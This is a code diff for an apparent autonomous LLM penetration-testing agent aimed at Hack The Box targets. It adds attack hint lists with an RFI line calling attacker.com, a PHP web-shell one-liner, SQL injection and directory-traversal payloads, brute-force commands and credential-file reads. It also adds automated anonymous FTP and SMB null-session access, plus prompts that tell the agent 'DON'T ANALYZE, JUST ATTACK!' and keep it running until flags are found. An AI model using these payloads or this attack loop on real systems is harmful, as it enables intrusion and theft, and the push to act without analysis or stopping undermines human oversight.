@@ -104,13 +104,16 @@ class Darkcircuit_Agent:
                     "Brute force if users found: hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>"
                 ],
                 "web": [
-                    "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js",
-                    "Check robots.txt, .htaccess, sitemap.xml, config.php, wp-config.php",
-                    "Try directory traversal: curl http://<target_ip>/page?file=../../../etc/passwd",
-                    "Test file upload: create PHP shell and upload if possible",
-                    "Check source code for credentials, comments, hidden forms",
-                    "Try common paths: /admin, /login, /config, /backup, /uploads",
-                    "Look for databases: phpmyadmin, adminer, database backups"
+                    "gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js,asp,aspx,jsp",
+                    "curl http://<target_ip>/robots.txt && curl http://<target_ip>/.htaccess",
+                    "Directory traversal: curl 'http://<target_ip>/index.php?page=../../../etc/passwd'",
+                    "LFI payloads: ?file=../../../etc/passwd&cmd=id",
+                    "RFI test: ?page=http://attacker.com/shell.txt",
+                    "Upload shell: echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
+                    "SQLi: ' OR 1=1-- -",
+                    "Common paths: /admin /login /config /backup /uploads /shell /webshell",
+                    "CMS attacks: /wp-admin /administrator /admin.php /login.php",
+                    "Database access: /phpmyadmin /adminer /mysql /db"
                 ],
                 "smb": [
                     "smbclient -L <target_ip> → list shares (try null session)",
@@ -131,16 +134,18 @@ class Darkcircuit_Agent:
                     "find /opt -name '*flag*' 2>/dev/null"
                 ],
                 "privilege_escalation": [
-                    "sudo -l → check sudo permissions",
-                    "find / -perm -4000 2>/dev/null → SUID binaries",
-                    "cat /etc/crontab → check cron jobs",
-                    "ps aux → check running processes as root",
-                    "netstat -tulpn → check listening services",
-                    "cat /etc/passwd → enumerate users",
-                    "ls -la /home → check user directories",
-                    "find / -writable 2>/dev/null | grep -v proc | head -10",
-                    "getcap -r / 2>/dev/null → check capabilities",
-                    "cat /etc/crontab /etc/cron*/* 2>/dev/null | grep -v '#'"
+                    "sudo -l → check sudo permissions (try GTFOBins)",
+                    "find / -perm -4000 2>/dev/null → SUID binaries (check GTFOBins)",
+                    "cat /etc/crontab && ls -la /etc/cron* → cron job hijacking",
+                    "ps aux | grep root → root processes to exploit",
+                    "netstat -tulpn | grep :127 → internal services",
+                    "find / -writable 2>/dev/null | grep -E '(etc|bin|sbin)' | head -5",
+                    "getcap -r / 2>/dev/null | grep -v 'getcap'",
+                    "ls -la /opt /srv /usr/local/bin → custom binaries",
+                    "cat ~/.bash_history /root/.bash_history 2>/dev/null",
+                    "find / -name '*.py' -perm -u+x 2>/dev/null | head -5 → Python scripts",
+                    "systemctl list-timers → systemd timers",
+                    "find /var/log -readable 2>/dev/null | head -5 → log poisoning"
                 ],
                 "reconnaissance": [
                     "nmap -p- --min-rate 10000 <target_ip>",
@@ -266,6 +271,16 @@ class Darkcircuit_Agent:
                 return f"🔍 FLAG HUNTING RESULTS - No flags found yet, keep exploiting!\n\n{combined_results}\n\n💡 TIP: Try different privilege escalation techniques!"
 
         @tool
+        async def smart_ftp_enum(self, target_ip: str) -> str:
+            """Smart FTP enumeration that avoids interactive sessions"""
+            try:
+                # Use automated FTP commands to avoid getting stuck
+                result = await self.run_command.ainvoke(f"echo -e 'anonymous\\nanonymous\\nls -la\\npwd\\nquit' | ftp -n {target_ip}")
+                return f"🔍 SMART FTP ENUMERATION:\n{result}"
+            except Exception as e:
+                return f"FTP enumeration failed: {str(e)}"
+
+        @tool
         async def run_command(command: str) -> str:
             """Execute a command on the remote SSH server (HTB Pwnbox environment)."""
             from agent_utils import optimize_command, wait_for_terminal_output
@@ -275,8 +290,8 @@ class Darkcircuit_Agent:
                 self.terminal_command_id += 1
                 command_id = self.terminal_command_id
 
-                # Optimize the command if possible
-                optimized_command, optimization_message = optimize_command(command)
+                # Use smart command optimization with shell context awareness
+                optimized_command, optimization_message = self.smart_command_optimization(command)
                 
                 # Add context reminder and flag detection for all commands
                 context_reminder = "\n[CONTEXT: You are on HTB Pwnbox executing commands against the target machine]"
@@ -316,6 +331,11 @@ class Darkcircuit_Agent:
                         # Add context reminder and flag hunting hints
                         output += context_reminder + flag_hunting_hint
                         
+                        # Add intelligent analysis prompts based on output
+                        analysis_prompt = self.analyze_command_output(optimized_command, output)
+                        if analysis_prompt:
+                            output += analysis_prompt
+                        
                         # Auto-detect potential flags in output
                         if 'HTB{' in output or 'user.txt' in output or 'root.txt' in output:
                             output += "\n\n🏆 POTENTIAL FLAG DETECTED IN OUTPUT! 🏆\n"
@@ -343,8 +363,7 @@ class Darkcircuit_Agent:
                         return failure_msg
                 else:
                     # Fallback to the old method using the frontend
-                    print(
-                        f"No direct SSH runner available, using frontend for command: {optimized_command} (ID: {command_id})")
+                    print(f"No direct SSH runner available, using frontend for command: {optimized_command} (ID: {command_id})")
 
                     # Tell the frontend to execute the command
                     if self.streaming_handler:
@@ -365,6 +384,11 @@ class Darkcircuit_Agent:
                         # Add context reminder and flag hunting hints
                         output += context_reminder + flag_hunting_hint
                         
+                        # Add intelligent analysis prompts based on output
+                        analysis_prompt = self.analyze_command_output(optimized_command, output)
+                        if analysis_prompt:
+                            output += analysis_prompt
+                        
                         # Auto-detect potential flags in output
                         if 'HTB{' in output or 'user.txt' in output or 'root.txt' in output:
                             output += "\n\n🏆 POTENTIAL FLAG DETECTED IN OUTPUT! 🏆\n"
@@ -384,10 +408,17 @@ class Darkcircuit_Agent:
             except Exception as e:
                 return f"Error executing command: {str(e)}"
 
+        # Add smart methods for shell context awareness
+        self.smart_command_optimization = self.smart_command_optimization
+        self.get_context_aware_hint = self.get_context_aware_hint
+        
         self.run_command = run_command
         self.rag_retrieve = rag_retrieve
         self.get_htb_techniques = get_htb_techniques
-        self.tools = [self.search, self.run_command, self.rag_retrieve, self.get_htb_techniques]
+        self.auto_enumerate = auto_enumerate
+        self.hunt_flags = hunt_flags
+        self.smart_ftp_enum = smart_ftp_enum
+        self.tools = [self.search, self.run_command, self.rag_retrieve, self.get_htb_techniques, self.auto_enumerate, self.hunt_flags, self.smart_ftp_enum]
         self.llm_with_tools = self.llm.bind_tools(self.tools)
 
         # Load default prompts from file or use hardcoded defaults
@@ -401,6 +432,179 @@ class Darkcircuit_Agent:
         print("🔄 Initializing RAG system for instant responses...")
         from Rag_tool import preload_rag_system
         preload_rag_system()
+
+    def smart_command_optimization(self, command: str):
+        """Optimize commands with shell context awareness"""
+        from agent_utils import optimize_command
+        
+        # Basic optimization first
+        optimized_command, optimization_message = optimize_command(command)
+        
+        # FTP session detection and automation
+        if 'ftp ' in command.lower() and not any(flag in command for flag in ['-n', '<<<', 'curl', 'wget']):
+            # This looks like an interactive FTP command - automate it
+            target = command.split()[-1] if command.split() else 'target_ip'
+            optimized_command = f"echo 'anonymous\\nanonymous\\nls -la\\npwd\\nquit' | ftp -n {target}"
+            optimization_message = "🚨 AUTOMATED FTP SESSION - avoids getting stuck in interactive mode"
+            
+        # SMB session detection
+        elif 'smbclient ' in command.lower() and '//' in command:
+            if '-N' not in command and '-U' not in command:
+                optimized_command = command + " -N"
+                optimization_message = "Added -N flag for null session"
+                
+        return optimized_command, optimization_message
+
+    def get_context_aware_hint(self, command: str):
+        """Provide context-aware hints based on command and current shell"""
+        
+        # FTP context detection and guidance
+        if any(ftp_cmd in command.lower() for ftp_cmd in ['ftp', 'anonymous']):
+            return "[FTP CONTEXT: If files found, EXIT and use 'wget ftp://anonymous:anonymous@target/filename' to download and analyze]"
+        
+        # SMB context
+        if any(smb_cmd in command.lower() for smb_cmd in ['smbclient', 'enum4linux']):
+            return "[SMB CONTEXT: Download files with 'get', then EXIT to analyze locally. Don't get stuck in SMB shell!]"
+            
+        # Web context
+        if any(web_cmd in command.lower() for web_cmd in ['gobuster', 'curl', 'wget']):
+            return "[WEB CONTEXT: Test found directories for LFI, upload, SQLi immediately]"
+            
+        # File operations
+        if any(cmd in command.lower() for cmd in ['ls', 'cat', 'find', 'grep']):
+            return "[FILE CONTEXT: Priority order: 1) Flags 2) SSH keys 3) Passwords 4) Config files]"
+            
+        return "[CONTEXT: Always prioritize flag hunting after any successful access]"
+
+    def analyze_command_output(self, command: str, output: str):
+        """Analyze command output and provide intelligent next steps"""
+        
+        if not output or len(output.strip()) < 5:
+            return "\n\n🤔 EMPTY OUTPUT - Command may have failed or needs different approach"
+        
+        # Analyze nmap results
+        if 'nmap' in command.lower():
+            open_ports = []
+            lines = output.split('\n')
+            for line in lines:
+                if '/tcp' in line and 'open' in line:
+                    port = line.split('/')[0].strip()
+                    service = line.split()[-1] if len(line.split()) > 2 else 'unknown'
+                    open_ports.append(f"{port}({service})")
+            
+            if open_ports:
+                next_steps = "\n\n🎯 NMAP ANALYSIS - IMMEDIATE ACTIONS REQUIRED:\n"
+                for port_service in open_ports[:5]:  # Show first 5 ports
+                    port = port_service.split('(')[0]
+                    service = port_service.split('(')[1].replace(')', '') if '(' in port_service else 'unknown'
+                    
+                    if '21' in port or 'ftp' in service.lower():
+                        next_steps += f"• Port {port} (FTP): run_command('echo \"anonymous\\nanonymous\\nls\\nquit\" | ftp -n <target_ip>')\n"
+                    elif '22' in port or 'ssh' in service.lower():
+                        next_steps += f"• Port {port} (SSH): Try common creds or look for SSH keys in other services\n"
+                    elif '80' in port or 'http' in service.lower():
+                        next_steps += f"• Port {port} (Web): run_command('gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt')\n"
+                    elif '443' in port or 'https' in service.lower():
+                        next_steps += f"• Port {port} (HTTPS): run_command('gobuster dir -u https://<target_ip> -w /usr/share/wordlists/dirb/common.txt')\n"
+                    elif '139' in port or '445' in port or 'smb' in service.lower():
+                        next_steps += f"• Port {port} (SMB): run_command('smbclient -L <target_ip> -N')\n"
+                        
+                next_steps += "\n🚨 EXECUTE ALL IMMEDIATELY - DON'T ANALYZE, JUST ATTACK!"
+                return next_steps
+            else:
+                return "\n\n❌ NO OPEN PORTS FOUND - Try UDP scan: nmap -sU --top-ports 100 <target_ip>"
+        
+        # Analyze FTP results
+        elif 'ftp' in command.lower() or 'anonymous' in output.lower():
+            if 'Login successful' in output or '230' in output or 'ftp>' in output:
+                files = []
+                lines = output.split('\n')
+                for line in lines:
+                    if any(ext in line.lower() for ext in ['.txt', '.conf', '.key', '.sql', '.php', '.sh']):
+                        filename = line.split()[-1] if line.split() else ''
+                        if filename and not filename.startswith('.'):
+                            files.append(filename)
+                
+                if files:
+                    next_steps = "\n\n📁 FTP FILES DETECTED - DOWNLOAD NOW:\n"
+                    for file in files[:5]:
+                        next_steps += f"• run_command('wget ftp://anonymous:anonymous@<target_ip>/{file}')\n"
+                    next_steps += "• Then: run_command('cat {downloaded_file} | grep -i password\\|key\\|flag\\|htb')\n"
+                    return next_steps
+                else:
+                    return "\n\n🔍 FTP ACCESS SUCCESSFUL - Try: run_command('echo \"anonymous\\nanonymous\\nls -la\\npwd\\nquit\" | ftp -n <target_ip>')"
+            elif 'Connection refused' in output or 'No route to host' in output:
+                return "\n\n❌ FTP CONNECTION FAILED - Service might be down or filtered"
+            elif 'Login incorrect' in output or '530' in output:
+                return "\n\n🔒 ANONYMOUS FTP DENIED - Try brute force: hydra -L users.txt -P passwords.txt ftp://<target_ip>"
+        
+        # Analyze web enumeration results
+        elif 'gobuster' in command.lower() or 'dirb' in command.lower():
+            found_dirs = []
+            lines = output.split('\n')
+            for line in lines:
+                if '200' in line or 'Status: 200' in line:
+                    # Extract directory from gobuster output
+                    parts = line.split()
+                    for part in parts:
+                        if part.startswith('/') and len(part) > 1:
+                            found_dirs.append(part)
+            
+            if found_dirs:
+                next_steps = "\n\n🌐 WEB DIRECTORIES FOUND - EXPLOIT NOW:\n"
+                for dir_path in found_dirs[:5]:
+                    next_steps += f"• run_command('curl http://<target_ip>{dir_path}/ | grep -i login\\|admin\\|config\\|password')\n"
+                    if 'admin' in dir_path.lower():
+                        next_steps += f"• run_command('curl http://<target_ip>{dir_path}/ | grep -i form\\|input')\n"
+                next_steps += "• Try LFI: run_command('curl \"http://<target_ip>/page?file=../../../etc/passwd\"')\n"
+                return next_steps
+            else:
+                return "\n\n🔍 NO WEB DIRECTORIES - Try different wordlist or check robots.txt"
+        
+        # Analyze SMB results
+        elif 'smbclient' in command.lower() or 'enum4linux' in command.lower():
+            if 'Sharename' in output or 'ADMIN$' in output:
+                shares = []
+                lines = output.split('\n')
+                for line in lines:
+                    if 'Disk' in line and '$' not in line:  # Look for non-admin shares
+                        share_name = line.split()[0] if line.split() else ''
+                        if share_name:
+                            shares.append(share_name)
+                
+                if shares:
+                    next_steps = "\n\n📂 SMB SHARES FOUND - ACCESS NOW:\n"
+                    for share in shares[:3]:
+                        next_steps += f"• run_command('smbclient //<target_ip>/{share} -N')\n"
+                    return next_steps
+                else:
+                    return "\n\n🔒 ONLY ADMIN SHARES - Try with credentials or null session"
+            else:
+                return "\n\n❌ SMB ACCESS DENIED - Try different authentication"
+        
+        # Analyze file content results
+        elif any(cmd in command.lower() for cmd in ['cat', 'grep', 'find']):
+            if 'HTB{' in output:
+                return "\n\n🏆 FLAG FOUND! MISSION ACCOMPLISHED! 🏆"
+            elif 'user.txt' in output or 'root.txt' in output:
+                return "\n\n🎯 FLAG FILE FOUND - READ IT: run_command('cat {flag_file_path}')"
+            elif 'password' in output.lower() or 'pass' in output.lower():
+                return "\n\n🔑 PASSWORDS DETECTED - Use for SSH/FTP/SMB access"
+            elif 'id_rsa' in output or 'ssh' in output.lower():
+                return "\n\n🗝️ SSH KEYS DETECTED - Download and use for SSH access"
+            elif output.strip() and 'No such file' not in output:
+                return "\n\n📋 FILES/CONTENT FOUND - Analyze for creds, configs, or escalation paths"
+        
+        # Generic analysis for other commands
+        elif output.strip():
+            if 'Permission denied' in output:
+                return "\n\n🚫 PERMISSION DENIED - Try privilege escalation or different approach"
+            elif 'command not found' in output.lower():
+                return "\n\n❌ COMMAND NOT FOUND - Try alternative commands or check if binary exists"
+            elif len(output.strip()) > 50:
+                return "\n\n✅ COMMAND SUCCESSFUL - Analyze output and plan next attack vector"
+        
+        return "\n\n🤖 OUTPUT RECEIVED - Continue with systematic enumeration"
 
     def _build_agent_graph(self):
         """Set up the LangGraph for agent reasoning."""
@@ -521,9 +725,18 @@ class Darkcircuit_Agent:
             result_text = getattr(result, "content", "").strip().lower()
             print(f"[Agent] Reasoner result preview: {result_text[:100]}...")
 
-            # Original simple logic - determine if we're done based on the magic phrase
-            done = "[ready to answer]" in result_text
-            print(f"[Agent] Done status: {done}")
+            # Enhanced logic - only done if we found flags or exhausted all options
+            found_flags = "htb{" in result_text or "user.txt" in result_text or "root.txt" in result_text
+            ready_phrase = "[ready to answer]" in result_text
+            
+            # Be more aggressive - only stop if we explicitly found flags or said we're ready
+            done = ready_phrase and (found_flags or "exhausted" in result_text or "no more" in result_text)
+            
+            # If we haven't found flags and it's been less than 20 messages, keep going
+            if not found_flags and len(state["messages"]) < 20:
+                done = False
+                
+            print(f"[Agent] Done status: {done}, Found flags: {found_flags}, Messages: {len(state['messages'])}")
             
             # Update the state with filtered messages and the result
             new_messages = filtered_messages + [result]
